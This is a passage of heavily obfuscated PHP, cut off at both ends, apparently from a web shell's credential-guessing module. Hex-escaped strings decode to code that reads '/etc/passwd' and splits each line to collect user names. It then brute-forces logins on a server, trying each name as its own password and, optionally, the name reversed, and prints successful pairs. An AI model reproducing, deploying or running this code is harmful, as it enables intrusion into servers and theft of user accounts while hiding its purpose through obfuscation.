le("/\x65\x74\x63/\x70a\x73s\x77d");if(is_array(${${"\x47\x4cOBAL\x53"}["v\x62b\x68c\x71s\x68"]})){$ovrixujdea="\x6c\x69\x6e\x65";foreach(${${"GL\x4f\x42\x41LS"}["\x68r\x74wyjd\x66l\x63"]} as${$ovrixujdea}){${"\x47LO\x42A\x4cS"}["py\x6a\x6f\x6c\x70\x64\x67"]="l\x69\x6e\x65";$fmxubtic="\x73e\x72\x76\x65r";$labtkgjil="\x6c\x69\x6ee";${${"\x47L\x4f\x42\x41LS"}["\x6etf\x66a\x6es\x73"]}=explode(":",${${"G\x4cOB\x41\x4c\x53"}["p\x79j\x6f\x6cp\x64\x67"]});++${${"\x47\x4c\x4fB\x41\x4c\x53"}["\x69vet\x75\x73\x69\x6f\x76\x76"]};if(bruteForce(@${$fmxubtic}[0],@${${"\x47\x4c\x4f\x42\x41\x4cS"}["\x64\x65\x6cn\x66\x63x\x6c\x6bj"]}[1],${$labtkgjil}[0],${${"\x47\x4c\x4fB\x41\x4c\x53"}["\x6e\x74\x66\x66\x61n\x73\x73"]}[0])){${"\x47\x4c\x4f\x42\x41\x4c\x53"}["ty\x75\x78\x6ft\x65\x77\x76"]="l\x69n\x65";${${"\x47L\x4f\x42A\x4c\x53"}["\x79\x6db\x6b\x66\x66\x73\x6e\x6f"]}++;echo"\x3cb\x3e".htmlspecialchars(${${"\x47LO\x42\x41LS"}["\x6e\x74f\x66a\x6e\x73\x73"]}[0])."</\x62\x3e:".htmlspecialchars(${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["t\x79\x75\x78o\x74\x65\x77\x76"]}[0])."\x3c\x62r>";}if(@$_POST["\x72\x65\x76e\x72se"]){$fnfckpky="\x74m\x70";${$fnfckpky}="";${"\x47\x4c\x4f\x42A\x4c\x53"}["\x6c\x6e\x75\x68\x78\x6c\x75"]="at\x74\x65\x6dp\x74\x73";$cgdpdwh="\x6c\x69\x6e\x65";$dcgceserj="\x73e\x72v\x65r";${"GL\x4f\x42\x41LS"}["ufrn\x69jp\x70\x6f"]="i";$pmoelus="\x69";for(${${"\x47LO\x42\x41\x4cS"}["\x75fr\x6e\x69\x6ap\x70\x6f"]}=strlen(${${"\x47L\x4f\x42\x41L\x53"}["\x6e\x74\x66fan\x73s"]}[0])-1;${${"\x47L\x4fB\x41\x4c\x53"}["q\x65\x75\x78z\x6b"]}>=0;--${${"G\x4c\x4fB\x41L\x53"}["\x71\x65\x75\x78\x7a\x6b"]})${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x73\x79\x6c\x7a\x79\x70\x78\x6dk"]}.=${${"\x47\x4cO\x42\x41LS"}["\x6e\x74f\x66an\x73\x73"]}[0][${$pmoelus}];++${${"\x47\x4c\x4f\x42A\x4c\x53"}["\x6cn\x75\x68xl\x75"]};if(bruteForce(@${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["de\x6cn\x66\x63xl\x6bj"]}[0],@${$dcgceserj}[1],${$cgdpdwh}[0],${${"G\x4c\x4f\x42A\x4c\x53"}["\x73y\x6c\x7ay\x70x\x6d\x6b"]})){${${"G\x4c\x